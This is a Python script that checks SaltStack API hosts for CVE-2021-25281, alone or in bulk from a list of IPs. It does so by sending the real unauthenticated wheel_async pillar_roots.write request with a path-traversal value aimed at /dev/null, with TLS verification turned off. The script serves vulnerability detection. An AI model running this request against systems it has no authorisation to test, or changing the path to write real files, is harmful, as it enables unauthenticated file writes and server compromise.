#!/bin/env python3

#PoC referenced to create this detection script: https://github.com/Immersive-Labs-Sec/CVE-2021-25281/blob/main/cve-2021-25281.py

import sys
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

parser = argparse.ArgumentParser(description="Detection script for CVE-2021-25281.")
parser.add_argument("-t", "--target", help="IP or Domain of a single target Saltstack instance.")
parser.add_argument("-p", "--port", type=int, default=8000, help="Target Port (Default: 8000)")
parser.add_argument("-f", "--file", type=argparse.FileType('r'), help="File of IPs for mass scanning. (Separated by new line)")
parser.add_argument("-T", "--timeout", type=int, default=3, help="How long before a request times out. (Default: 3)")
args = parser.parse_args()

#If no arguments are chosen, help is opened.
if len(sys.argv) == 1:
	parser.print_help()

def detect(target):

	saltstack = False

	#Ensuring no duplicate "/" characters
	if target[-1] == "/":
		targetURL = target[:-1] + ":" + str(args.port)
	else:
		targetURL = target + ":" + str(args.port)

	#SSL is required for the Saltstack API. Convert HTTP to HTTPS
	if target.startswith("http") and not target.startswith("https"):
		print("[*] SSL is required, changing to HTTPS.")
		targetURL = "https" + targetURL[4:]

	#If protocol is not specified, add HTTPS to target.
	if not target.startswith("h"):
		targetURL = "https://" + targetURL

	targetDir = "/run"

	try:
		r = requests.get(targetURL+targetDir, verify=False, timeout=args.timeout)
		#wheel_async is the vulnerable client.
		if "wheel_async" in r.text:
			print("[+] Connection to Saltstack API established.")

			saltstack = True

	except requests.exceptions.RequestException:
		print(f"[!] ERROR: {targetURL} unreachable.\n")
	
	if saltstack:
		#Exploit
		r = requests.post(
			targetURL+targetDir,
			verify=False, 
			json = 
				{
				"eauth": "auto",
            	"client": "wheel_async",
            	"fun": "pillar_roots.write",
            	"data": "",
            	"path": f"../../../../../../dev/null"
            	})

		if "401 Unauthorized" not in r.text and "jid" in r.text:
			print(f"[+] Target: {targetURL} is vulnerable to CVE-2021-25281.\n")
		else:
			print(f"[-] Target: {targetURL} is NOT vulnerable to CVE-2021-25281.\n")

if args.target:
	detect(args.target)

if args.file:
	for line in args.file:
		detect(line.strip())